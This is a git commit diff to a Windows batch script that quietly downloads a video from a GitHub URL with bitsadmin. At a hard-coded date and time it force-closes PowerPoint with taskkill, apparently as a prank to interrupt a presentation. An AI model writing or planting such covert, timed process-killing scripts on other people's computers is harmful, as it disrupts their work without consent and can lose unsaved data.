4063b942b1cc557dfea1f31dd5a1ba4c383d3154
similartobash <120057329+similartobash@users.noreply.github.com>
2023-03-04 11:28:20 +0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,14 +1,14 @@
 @echo off
 
-if exist "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt" exit
+echo up > "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt"
 
 if not exist "%TEMP%\ataturk.mp4" (
 bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
 )
 
-if "%date%" == "Pzt 19.12.2022" (
+if "%date%" == "Cmt 04.03.2023" (
 :timeloop
-if "%time:~0,5%" == "11:55" (
+if "%time:~0,5%" == "11:40" (
 taskkill /f /im POWERPNT.EXE
 rem set video2play="%TEMP%\ataturk.mp4"
 rem set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
